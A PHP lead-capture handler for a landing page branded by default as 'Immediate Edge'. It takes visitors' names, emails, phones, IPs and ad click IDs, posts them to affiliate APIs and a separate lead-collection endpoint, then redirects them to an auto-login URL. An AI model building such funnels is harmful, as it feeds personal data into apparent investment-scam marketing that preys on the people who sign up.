<?php
session_start();

function sanitize($str) {
    return htmlspecialchars(stripslashes(trim($str)));
}

function capitalizeWords($str) {
    return ucwords(strtolower($str));
}

$ff_hit_id = $_POST['intgrtn_custom2'] ?? '';
$gbraid    = $_POST['gbraid'] ?? '';
$wbraid    = $_POST['wbraid'] ?? '';
$gclid     = $_POST['gclid'] ?? '';
$msclkid   = $_POST['msclkid'] ?? '';

$keywords = $_POST['kw'] ?? 'Immediate Edge';
$keyword = capitalizeWords($keywords);

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ipdevice = getUserIP();
$response = @file_get_contents("https://obtener-ipget.cloudf1-44f.workers.dev/?ip={$ipdevice}");
$ipInfo = json_decode($response, true);
$countryCode = $ipInfo['country']  ?? '';
$prefix      = $ipInfo['prefijo']  ?? '';
$region      = $ipInfo['region']   ?? '';

$apiResponse = null;
if ($countryCode) {
    $data = [
        'url'     => (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' 
                      ? "https" : "http") . "://$_SERVER[HTTP_HOST]",
        'country' => $countryCode,
        'region'  => $region
    ];
    $options = [
        'http' => [
            'header'  => "Content-Type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
        ],
    ];
    $context = stream_context_create($options);
    $result = @file_get_contents('https://winnermasterapi.vercel.app/api/get-value', false, $context);
    if ($result !== false) {
        $apiResponse = json_decode($result, true);
    }
}
$selectedApiKey = $apiResponse['selectedapikey'] ?? '';


$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $firstName = sanitize($_POST['first_name'] ?? '');
    $lastName  = sanitize($_POST['last_name']  ?? '');
    $email     = sanitize($_POST['email']      ?? '');
    $phone     = sanitize($_POST['phone1']     ?? '');

    // 4.2) Validar cada campo
    if (empty($firstName)) {
        $errors['first_name'] = 'Mandatory';
    }
    if (empty($lastName)) {
        $errors['last_name'] = 'Mandatory';
    }
    if (empty($email)) {
        $errors['email'] = 'Mandatory';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors['email'] = 'Invalid';
    }
    if (empty($phone)) {
        $errors['phone1'] = 'Mandatory';
    }

    if (!empty($errors)) {

        $origParams = [];
        if (!empty($_SERVER['HTTP_REFERER'])) {
            $ref = $_SERVER['HTTP_REFERER'];
            $parsed = parse_url($ref);
            if (isset($parsed['query'])) {
                parse_str($parsed['query'], $origParams);
            }
        }

        
        $merged = $origParams;
        foreach ($errors as $campo => $msj) {
           
            $merged["err_{$campo}"] = $msj;
        }
       
        $merged['val_first_name'] = $firstName;
        $merged['val_last_name']  = $lastName;
        $merged['val_email']      = $email;
        $merged['val_phone1']     = $phone;

       
        $nuevaQS = http_build_query($merged);

       
        $rutaForm = 'index.html';

      
        header("Location: {$rutaForm}?{$nuevaQS}");
        exit;
    }

  
    $prefixWithPhone = $prefix . $phone;
    $formData = [
        'ipDevice'   => $ipdevice,
        'firstName'  => $firstName,
        'lastName'   => $lastName,
        'email'      => $email,
        'numberPhone'=> $prefixWithPhone,
        'nameMarca'  => $keyword,
        'hit'        => $ff_hit_id,
        'userAgent'  => $_SERVER['HTTP_USER_AGENT'],
        'codeCountry'=> $countryCode,
        'areaCode'   => $prefix
    ];

    if (!empty($selectedApiKey)) {
        $urlApi = "https://all-apis-post.vercel.app" . $selectedApiKey;
        $options = [
            'http' => [
                'header'  => "Content-type: application/json\r\n",
                'method'  => 'POST',
                'content' => json_encode($formData),
                'ignore_errors' => true 
            ],
        ];
        $context = stream_context_create($options);
        
        
        $apiResult = @file_get_contents($urlApi, false, $context);
        $status = $http_response_header[0] ?? '';
        $responseHeaders = $http_response_header ?? [];
        $apiData = $apiResult !== false ? json_decode($apiResult, true) : null;
        
        $sendData = array_merge($formData, [
            'dataApi' => $apiData,
            'statusApi' => $status,
            'responseHeaders' => $responseHeaders,
            'nameApi' => $selectedApiKey,
            'urlBase' => (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' 
                         ? "https" : "http") . "://$_SERVER[HTTP_HOST]",
            'gbraid' => $gbraid,
            'wbraid' => $wbraid,
            'gclid' => $gclid,
            'msclkid' => $msclkid
        ]);
        
        $options2 = [
            'http' => [
                'header'  => "Content-type: application/json\r\n",
                'method'  => 'POST',
                'content' => json_encode($sendData),
                'ignore_errors' => true 
            ],
        ];
        $context2 = stream_context_create($options2);
        file_get_contents('https://winnermasterapi.vercel.app/infoUser/add-lead', false, $context2);

        if ($apiResult !== false) {
            $apiData = json_decode($apiResult, true);
            $status  = $http_response_header[0] ?? '';
            
            $redirectUrl = '';
            if (isset($apiData['apiResponse']['details']['redirect']['url'])) {
                $redirectUrl = $apiData['apiResponse']['details']['redirect']['url'];
            } elseif (isset($apiData['apiResponse']['auto_login_url'])) {
                $redirectUrl = $apiData['apiResponse']['auto_login_url'];
            } elseif (isset($apiData['auto_login_url'])) {
                $redirectUrl = $apiData['auto_login_url'];
            } elseif (isset($apiData['apiResponse']['extras']['redirect']['url'])) {
                $redirectUrl = $apiData['apiResponse']['extras']['redirect']['url'];
            }

            if (!empty($redirectUrl)) {
                // MODIFICACIÓN: Usar parámetros GET en lugar de sesión
                $params = [
                    'redirectUrl' => urlencode($redirectUrl),
                    'nameMarca' => urlencode($keyword)
                ];
                
                // Construir la URL con parámetros
                $redirectTarget = 'typ.php?' . http_build_query($params);
                
                // Redireccionar
                header('Location: ' . $redirectTarget);
                exit;
            } else {
                $errors['general'] = 'Please try again later.';
            }
        } else {
            $errors['general'] = 'Error communicating with the API. Please try again later.';
        }
    } else {
        $errors['general'] = 'Could not determine which API to use.';
    }

    if (isset($errors['general'])) {
        
        $origParams = [];
        if (!empty($_SERVER['HTTP_REFERER'])) {
            $ref = $_SERVER['HTTP_REFERER'];
            $parsed = parse_url($ref);
            if (isset($parsed['query'])) {
                parse_str($parsed['query'], $origParams);
            }
        }
        // Añadimos err_general
        $origParams['err_general'] = $errors['general'];
        $qsGen = http_build_query($origParams);
        header("Location: index.html?{$qsGen}");
        exit;
    }
}